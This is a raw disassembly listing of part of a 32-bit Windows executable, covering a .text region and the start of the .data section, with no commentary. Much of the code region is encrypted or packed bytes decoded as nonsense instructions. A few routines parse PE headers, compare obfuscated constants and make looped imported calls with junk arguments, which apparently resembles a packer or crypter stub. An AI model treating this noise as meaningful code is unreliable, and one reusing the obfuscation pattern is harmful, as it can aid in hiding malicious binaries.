  411456:	jns    0x411497
  411458:	shr    BYTE PTR [edi],1
  41145a:	(bad)  
  41145b:	and    BYTE PTR [ecx],ch
  41145d:	ins    DWORD PTR es:[edi],dx
  41145e:	mov    ecx,0x14881a2a
  411463:	in     eax,0x41
  411465:	jg     0x41145a
  411467:	mov    bl,0x3b
  411469:	sbb    cl,BYTE PTR [edi+0x64]
  41146c:	xchg   edx,eax
  41146d:	sub    esp,DWORD PTR [ecx+0x29]
  411470:	and    DWORD PTR [esi+eiz*4-0x74585167],esp
  411477:	pop    edx
  411478:	aaa    
  411479:	bound  esi,QWORD PTR [ebx+0x242019f9]
  41147f:	push   0x2bbbf617
  411484:	jge    0x41149e
  411486:	rol    DWORD PTR [ebx+ebx*4+0x3eb9d72a],1
  41148d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41148e:	rcl    DWORD PTR [edx],cl
  411490:	cwde   
  411491:	mov    DWORD PTR [edx],eax
  411493:	in     al,dx
  411494:	lock xchg esi,eax
  411496:	loopne 0x4114e3
  411498:	inc    eax
  411499:	aam    0xe4
  41149b:	mov    al,ds:0xc50b02dd
  4114a0:	adc    ebx,DWORD PTR [edi+0x2608c25e]
  4114a6:	outs   dx,DWORD PTR ds:[esi]
  4114a7:	les    edx,FWORD PTR [eax-0x12]
  4114aa:	subps  xmm4,XMMWORD PTR ds:0x4515b9d6
  4114b1:	cld    
  4114b2:	pop    ebx
  4114b3:	push   ss
  4114b4:	jl     0x41144b
  4114b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114b7:	xor    BYTE PTR [esi-0x32cc577d],bl
  4114bd:	dec    esi
  4114be:	adc    eax,0x20ceac4e
  4114c3:	inc    ebx
  4114c4:	pop    ebp
  4114c5:	mov    ebx,0xff649c9b
  4114ca:	jno    0x4114bc
  4114cc:	(bad)  
  4114cd:	sahf   
  4114ce:	out    0x4f,eax
  4114d0:	mov    cl,0x1
  4114d2:	shl    DWORD PTR [ebx+0x27df7249],cl
  4114d8:	ds in  eax,0x14
  4114db:	int3   
  4114dc:	jmp    DWORD PTR [edi-0x7e]
  4114df:	imul   esp,DWORD PTR [ebx-0x78],0x48
  4114e3:	cmp    BYTE PTR [edx+ebp*2],bl
  4114e6:	or     edi,ebx
  4114e8:	ja     0x4114f2
  4114ea:	cmp    al,0xf
  4114ec:	inc    edx
  4114ed:	dec    edx
  4114ee:	sub    bh,BYTE PTR [ebx+0x61219e0d]
  4114f4:	sub    al,0xe7
  4114f6:	loope  0x411554
  4114f8:	xchg   ebx,eax
  4114f9:	pop    ebp
  4114fa:	pusha  
  4114fb:	lods   al,BYTE PTR ds:[esi]
  4114fc:	ds push cs
  4114fe:	dec    eax
  4114ff:	idiv   DWORD PTR [eax-0x5cca635b]
  411505:	and    BYTE PTR [edx+0x2e],0xae
  411509:	aam    0x1
  41150b:	pop    eax
  41150c:	mul    al
  41150e:	sbb    ecx,esi
  411510:	jmp    0x8971:0x288d607d
  411517:	ds je  0x4114a9
  41151a:	addr16 test eax,0xd5816027
  411520:	dec    eax
  411521:	xor    DWORD PTR [edi],0xf6868860
  411527:	xor    BYTE PTR [edx],bl
  411529:	fisttp DWORD PTR [ecx-0x2e8ad9a7]
  41152f:	jmp    0x4114e3
  411531:	jl     0x4114fb
  411533:	fisttp DWORD PTR [esi+esi*4+0x441c0a58]
  41153a:	xchg   bh,bh
  41153c:	mov    dh,0x89
  41153e:	pop    ecx
  41153f:	and    eax,0x9211fb60
  411544:	push   0x8bda259c
  411549:	adc    eax,0x8acfa632
  41154e:	pusha  
  41154f:	rcl    DWORD PTR [esi+0x5862b723],0xf0
  411556:	dec    ebx
  411557:	push   esp
  411558:	outs   dx,BYTE PTR ds:[esi]
  411559:	nop
  41155a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41155b:	sub    esi,DWORD PTR [ecx]
  41155d:	or     DWORD PTR [ebp+0x6d6f7785],edi
  411563:	in     eax,0xb7
  411565:	ret    
  411566:	sti    
  411567:	cld    
  411568:	and    eax,0x790a1489
  41156d:	mov    ebp,0xeef04a61
  411572:	jg     0x411576
  411574:	pop    edx
  411575:	push   cs
  411576:	icebp  
  411577:	stc    
  411578:	in     al,0xb2
  41157a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41157b:	jno    0x41158e
  41157d:	dec    esp
  41157e:	mov    edx,0xf918dfae
  411583:	mov    WORD PTR [esi+0x49026487],gs
  411589:	call   0xe9df:0xf078ba6b
  411590:	lods   eax,DWORD PTR ds:[esi]
  411591:	mov    ebp,0xd88afbcc
  411596:	mov    ecx,0x947e979a
  41159b:	bound  edx,QWORD PTR ds:0xf6b7224
  4115a1:	adc    BYTE PTR [edi+0x7c],dh
  4115a4:	push   cs
  4115a5:	gs stos DWORD PTR es:[edi],eax
  4115a7:	jbe    0x41159d
  4115a9:	outs   dx,BYTE PTR ds:[esi]
  4115aa:	sub    eax,0x1989d9b1
  4115af:	(bad)  
  4115b0:	jae    0x4115ae
  4115b2:	push   edi
  4115b3:	and    al,0x5b
  4115b5:	repz shl DWORD PTR [ebx+0x7c],1
  4115b9:	mov    ah,0xfe
  4115bb:	add    DWORD PTR [esp+edx*1-0x69],ebx
  4115bf:	jb     0x4115eb
  4115c1:	pop    ss
  4115c2:	push   edx
  4115c3:	pop    ss
  4115c4:	mov    esp,0x324b52ac
  4115c9:	adc    DWORD PTR [esi],ecx
  4115cb:	jp     0x411622
  4115cd:	jl     0x4115d9
  4115cf:	pop    edi
  4115d0:	xor    ebp,ebx
  4115d2:	repz push ebx
  4115d4:	mov    edx,DWORD PTR [ebp+0x8]
  4115d7:	xor    eax,ecx
  4115d9:	lea    eax,[eax+edx*1+0x32729b]
  4115e0:	mov    DWORD PTR [ebp+0x8],eax
  4115e3:	inc    DWORD PTR [ebp+0xc]
  4115e6:	jmp    0x410fe6
  4115eb:	mov    eax,DWORD PTR [ebp-0x10]
  4115ee:	xor    eax,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	adc    bl,BYTE PTR [ebx+esi*4]
  41161b:	jns    0x4115a3
  41161d:	inc    eax
  41161e:	jle    0x41169e
  411620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411621:	jg     0x4116a1
  411623:	jle    0x41168d
  411625:	loope  0x4115fd
  411627:	rol    DWORD PTR [ecx-0x56e858c5],cl
  41162d:	test   BYTE PTR [eax+0xf],ah
  411630:	mov    ah,0x16
  411632:	cld    
  411633:	xchg   ebp,eax
  411634:	mov    ?,WORD PTR [esi+0x50b6f9be]
  41163a:	pop    ebp
  41163b:	mov    BYTE PTR [ebp-0x8],al
  41163e:	xlat   BYTE PTR ds:[ebx]
  41163f:	lea    esi,[edx]
  411641:	sub    DWORD PTR [edi+eiz*1-0x30c442d8],eax
  411648:	mov    gs,WORD PTR [ebp+0x73c1aa46]
  41164e:	test   BYTE PTR [edi+0x78a1c0fe],0xd3
  411655:	addr16 loope 0x411664
  411658:	sbb    DWORD PTR [ebx-0x56],edi
  41165b:	inc    edx
  41165c:	retf   
  41165d:	pushf  
  41165e:	adc    al,0x5
  411660:	shr    al,1
  411662:	cmp    al,0x55
  411664:	out    dx,eax
  411665:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411666:	inc    edi
  411667:	add    al,0x23
  411669:	mov    DWORD PTR [edx-0x38ac82f4],ebx
  41166f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411670:	sub    eax,DWORD PTR [edi]
  411672:	push   esi
  411673:	or     eax,0xc8931e47
  411678:	jae    0x4116f4
  41167a:	leave  
  41167b:	test   DWORD PTR [edx],0x6eb1b81d
  411681:	pop    ss
  411682:	xor    DWORD PTR [eax+0x71],ebp
  411685:	cmp    BYTE PTR [ebx],al
  411687:	mov    dh,cl
  411689:	jmp    0xa1b9b76
  41168e:	cwde   
  41168f:	ror    DWORD PTR [ecx-0x1a],cl
  411692:	mov    eax,ds:0xa1bb703a
  411697:	jbe    0x41163d
  411699:	and    dh,dl
  41169b:	outs   dx,BYTE PTR es:[esi]
  41169d:	pop    esp
  41169e:	sbb    ebp,DWORD PTR [esi]
  4116a0:	jbe    0x41170f
  4116a2:	jbe    0x4116ad
  4116a4:	mov    ah,0xe2
  4116a6:	cdq    
  4116a7:	dec    edx
  4116a8:	mov    al,ds:0xbd44581d
  4116ad:	mov    bh,0xc4
  4116af:	outs   dx,DWORD PTR ds:[esi]
  4116b0:	or     ebx,0x52d4885b
  4116b6:	cdq    
  4116b7:	in     eax,0xa5
  4116b9:	and    cl,BYTE PTR [esi]
  4116bb:	dec    ebx
  4116bc:	adc    al,0x57
  4116be:	aaa    
  4116bf:	das    
  4116c0:	jno    0x4116e0
  4116c2:	mov    al,ds:0xd4147eae
  4116c7:	xchg   BYTE PTR [edx+eax*4-0x19b4f8cd],ah
  4116ce:	adc    DWORD PTR [edi],esi
  4116d0:	je     0x41171b
  4116d2:	in     eax,dx
  4116d3:	push   esi
  4116d4:	rcr    ch,1
  4116d6:	fs push cs
  4116d8:	dec    ecx
  4116d9:	enter  0xd921,0x30
  4116dd:	mov    ecx,0x1243d52c
  4116e2:	mov    DWORD PTR [edi-0x6b],ecx
  4116e5:	cmp    esi,DWORD PTR [ecx-0x5a]
  4116e8:	aam    0x69
  4116ea:	inc    esi
  4116eb:	loop   0x41171a
  4116ed:	js     0x411675
  4116ef:	(bad)  
  4116f0:	jg     0x4116de
  4116f2:	(bad)  
  4116f3:	sub    bh,BYTE PTR [edi-0x7d7efa00]
  4116f9:	hlt    
  4116fa:	push   esp
  4116fb:	xchg   ebx,eax
  4116fc:	dec    edi
  4116fd:	lods   eax,DWORD PTR ds:[esi]
  4116fe:	outs   dx,BYTE PTR ds:[esi]
  4116ff:	jp     0x4116f7
  411701:	icebp  
  411702:	sub    BYTE PTR [ebx+0x758b1246],al
  411708:	mov    dh,BYTE PTR [ecx]
  41170a:	aaa    
  41170b:	call   0xbe5a:0x9ff2d03
  411712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411713:	popf   
  411714:	jne    0x4116cf
  411716:	std    
  411717:	mov    dl,0x10
  411719:	cmp    eax,0x2e924f66
  41171e:	push   ecx
  41171f:	in     al,dx
  411720:	mov    esp,0x31c979f0
  411726:	scas   eax,DWORD PTR es:[edi]
  411727:	mov    cs,WORD PTR [ecx+esi*4]
  41172a:	into   
  41172b:	cld    
  41172c:	rol    DWORD PTR [eax+0xce52e80],1
  411732:	push   ecx
  411733:	jle    0x411786
  411735:	imul   esi,DWORD PTR [edi-0x41],0x27ca977f
  41173c:	dec    eax
  41173d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41173e:	dec    esp
  41173f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411740:	mov    ds,WORD PTR [eax+0x6a539ca4]
  411746:	and    eax,0x2d988eb1
  41174b:	dec    ebx
  41174c:	ror    DWORD PTR [esi+0x131b9f89],1
  411752:	(bad)  
  411754:	xchg   ecx,esi
  411756:	push   edx
  411757:	fcom   DWORD PTR ds:0x5d06dd10
  41175d:	pop    es
  41175e:	popa   
  41175f:	sbb    BYTE PTR [ebx+0x49],bh
  411762:	adc    eax,0xbc2cf61c
  411767:	div    bh
  411769:	cmp    al,0x2
  41176b:	mov    ds:0xeb8da3c9,al
  411770:	or     ecx,esi
  411772:	loop   0x41177e
  411774:	push   ss
  411775:	mov    ebx,0x46253c57
  41177a:	shl    DWORD PTR [ecx+0x5a],cl
  41177d:	sbb    al,0x3a
  41177f:	cwde   
  411780:	push   0x7ead2d4a
  411785:	ror    BYTE PTR [eax+0x1f],cl
  411788:	xlat   BYTE PTR ds:[ebx]
  411789:	jecxz  0x41179c
  41178b:	loop   0x4117c3
  41178d:	dec    esi
  41178e:	bound  ebx,QWORD PTR ds:0x181696ab
  411794:	out    0x30,al
  411796:	push   esi
  411797:	mov    eax,ds:0x560a05b7
  41179c:	push   cs
  41179d:	jmp    0x795500b5
  4117a2:	stc    
  4117a3:	enter  0x999f,0xbe
  4117a7:	mov    bl,0x86
  4117a9:	test   al,0x1b
  4117ab:	push   ebp
  4117ac:	(bad)  
  4117ad:	js     0x411749
  4117af:	xchg   DWORD PTR ds:0x87446e3d,ecx
  4117b5:	retf   
  4117b6:	test   BYTE PTR [ebx+0x23],0x91
  4117ba:	mov    bl,0x6a
  4117bc:	adc    al,0x38
  4117be:	fiadd  DWORD PTR [esi-0x27f651a6]
  4117c4:	mov    eax,ecx
  4117c6:	push   ss
  4117c7:	js     0x411822
  4117c9:	add    ebp,DWORD PTR [eax-0x12]
  4117cc:	popa   
  4117cd:	fmul   QWORD PTR [ebx+0x5c70845]
  4117d3:	mov    ds:0x3d004337,eax
  4117d8:	inc    edx
  4117d9:	add    BYTE PTR [eax],al
  4117db:	mov    al,BYTE PTR [eax]
  4117dd:	sub    DWORD PTR ds:0x4336ff,0x6d7d
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43379f,0x433703
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43379f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43371b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x4337ab,0x0
  41182f:	mov    eax,ds:0x4337ab
  411834:	inc    eax
  411835:	mov    ds:0x4337ab,eax
  41183a:	cmp    DWORD PTR ds:0x4337ab,0xb
  411841:	jne    0x411887
  411847:	push   0x4338bc
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x4337ab,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x4337ab
  411899:	inc    eax
  41189a:	mov    ds:0x4337ab,eax
  41189f:	cmp    DWORD PTR ds:0x4337ab,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	push   esi
  4118e8:	rcr    BYTE PTR [ebx+0x7e4e2c10],1
  4118ee:	jle    0x411894
  4118f0:	jg     0x411970
  4118f2:	jle    0x41188e
  4118f4:	(bad)  
  4118f6:	mov    ecx,0x7ef82373
  4118fb:	dec    esi
  4118fc:	xor    cl,BYTE PTR [edx]
  4118fe:	lods   al,BYTE PTR ds:[esi]
  4118ff:	inc    esp
  411900:	mov    ds:0x2b64f39e,al
  411905:	sbb    ch,al
  411907:	sti    
  411908:	inc    eax
  411909:	jl     0x4118af
  41190b:	mov    ebx,0x6a117c3f
  411910:	xchg   esi,eax
  411911:	mov    ebp,0x6d4d4a52
  411916:	xchg   ebp,esi
  411918:	rcl    BYTE PTR [ecx],cl
  41191a:	adc    DWORD PTR [eax+0x64b31734],ebp
  411920:	std    
  411921:	retf   
  411922:	sbb    edi,0x4211c2ae
  411928:	ja     0x41195d
  41192a:	mov    al,ds:0x9c8a647c
  41192f:	(bad)  
  411930:	or     al,0xe1
  411932:	jno    0x411921
  411934:	xchg   DWORD PTR [ecx-0x8],edi
  411937:	add    BYTE PTR [edx],ch
  411939:	lods   al,BYTE PTR ds:[esi]
  41193a:	sub    DWORD PTR [esi+ebp*1+0x27],eax
  41193e:	mov    dl,0xb4
  411940:	out    0xfc,al
  411942:	push   edi
  411943:	bound  ebx,QWORD PTR [ecx+ebx*2+0x34]
  411947:	ja     0x41190e
  411949:	xor    BYTE PTR ds:[edi+0x7e],ah
  41194d:	mov    dh,0x76
  41194f:	fwait
  411950:	mov    al,ah
  411952:	cdq    
  411953:	jle    0x411936
  411955:	into   
  411956:	cmp    BYTE PTR [ecx-0x22fb2826],ah
  41195c:	pusha  
  41195d:	push   ebp
  41195e:	ret    
  41195f:	bound  edx,QWORD PTR [eax]
  411961:	ins    DWORD PTR es:[edi],dx
  411962:	test   al,0xa7
  411964:	bound  sp,DWORD PTR [eax+0x32f74b8e]
  41196b:	test   BYTE PTR [edx],al
  41196d:	hlt    
  41196e:	js     0x411925
  411970:	test   eax,0x593af022
  411975:	xchg   ebp,eax
  411976:	mov    ebp,0xd9ebbf9a
  41197b:	cmp    dh,ch
  41197d:	test   DWORD PTR [esi+edx*4-0x38],0x6f95e6e7
  411985:	out    0xe6,al
  411987:	sahf   
  411988:	imul   esi,ebp,0x5249503a
  41198e:	bound  esp,QWORD PTR [ecx-0x7a]
  411991:	sbb    al,0xb5
  411993:	scas   al,BYTE PTR es:[edi]
  411994:	and    DWORD PTR [eax+eax*8],ebp
  411997:	mov    BYTE PTR [ebx+0x55],0xcb
  41199b:	ret    0x4894
  41199e:	xor    BYTE PTR [eax],dh
  4119a0:	mov    eax,0x27e8aaf8
  4119a5:	cmp    eax,0x3a0ae45d
  4119aa:	xchg   ebp,eax
  4119ab:	mov    BYTE PTR [esi+0x2566a732],ah
  4119b1:	jae    0x4119d3
  4119b3:	mov    edx,0xf9d832c2
  4119b8:	or     BYTE PTR [edx],bl
  4119ba:	fstp   DWORD PTR ss:[esi-0x5630f61d]
  4119c1:	push   eax
  4119c2:	stos   DWORD PTR es:[edi],eax
  4119c3:	cmp    edx,esi
  4119c5:	mov    dh,0x75
  4119c7:	call   0x1530:0x6dc2028e
  4119ce:	out    dx,al
  4119cf:	mov    DWORD PTR ds:0x44efd4e8,ebx
  4119d5:	lahf   
  4119d6:	jmp    0xac84:0x1a1aa58a
  4119dd:	adc    BYTE PTR [edi],dh
  4119df:	rcl    DWORD PTR [ebp-0x1961b2ef],cl
  4119e5:	popf   
  4119e6:	mul    DWORD PTR [edi]
  4119e8:	retf   0x7a5f
  4119eb:	mov    esi,0xdf3c29b6
  4119f0:	pop    esp
  4119f1:	mov    fs,ebp
  4119f3:	lods   al,BYTE PTR ds:[esi]
  4119f4:	sub    bl,BYTE PTR ds:0xdf289226
  4119fa:	push   esp
  4119fb:	or     al,0xcc
  4119fd:	add    edi,DWORD PTR [ebp+0x688fa1bc]
  411a03:	test   edx,0xce70dd6c
  411a09:	and    al,0xa6
  411a0b:	sbb    DWORD PTR [ebx+0x493a2134],esp
  411a11:	xchg   esi,eax
  411a12:	xchg   ebx,eax
  411a13:	push   es
  411a14:	cs pop esi
  411a16:	push   ecx
  411a17:	int3   
  411a18:	lea    edx,[eax+0x591f2485]
  411a1e:	pop    ebp
  411a1f:	dec    ebx
  411a20:	leave  
  411a21:	std    
  411a22:	fidivr WORD PTR [esi+0x4bda0a93]
  411a28:	jle    0x4119e9
  411a2a:	xchg   edx,eax
  411a2b:	sar    DWORD PTR [ebx],1
  411a2d:	sub    ah,BYTE PTR [eax+0x1e5cc267]
  411a33:	dec    eax
  411a34:	push   esp
  411a35:	push   edx
  411a36:	pop    ds
  411a37:	xchg   esp,eax
  411a38:	mov    cl,0x81
  411a3a:	imul   edx,DWORD PTR [eax],0x3
  411a3d:	test   esp,edx
  411a3f:	lods   eax,DWORD PTR ds:[esi]
  411a40:	mov    cl,0x55
  411a42:	mov    ebx,0xde92d376
  411a47:	imul   ebx,DWORD PTR [ebx+0x74],0x7e6d5de6
  411a4e:	js     0x4119de
  411a50:	dec    ebp
  411a51:	mov    ds:0x3adb87e6,al
  411a56:	pop    ebx
  411a57:	pop    edx
  411a58:	jne    0x411ad4
  411a5a:	push   esi
  411a5b:	repnz mov WORD PTR [esi-0x49688802],gs
  411a62:	jb     0x411a4c
  411a64:	or     cl,BYTE PTR [eax-0xe10147b]
  411a6a:	xor    edx,ebp
  411a6c:	aad    0xb1
  411a6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a6f:	xchg   DWORD PTR [ebx],edx
  411a71:	scas   eax,DWORD PTR es:[edi]
  411a72:	inc    ebx
  411a73:	lods   eax,DWORD PTR ds:[esi]
  411a74:	xchg   BYTE PTR [ebx],cl
  411a76:	aad    0x3
  411a78:	gs ret 0xd354
  411a7c:	mov    eax,ds:0x122256bf
  411a81:	pop    esi
  411a82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a83:	xor    eax,0x90ebc6ff
  411a88:	pop    ebp
  411a89:	cmp    ch,BYTE PTR [ecx+0x34]
  411a8c:	jae    0x411b0c
  411a8e:	and    eax,0x3c61f4d
  411a93:	jg     0x411a35
  411a95:	sub    BYTE PTR [eax+0x1dc05bdf],cl
  411a9b:	mov    cl,0x20
  411a9d:	add    eax,ecx
  411a9f:	jmp    0x411ab1
  411aa4:	mov    eax,DWORD PTR [ebp-0x4]
  411aa7:	xor    eax,0x7510854
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
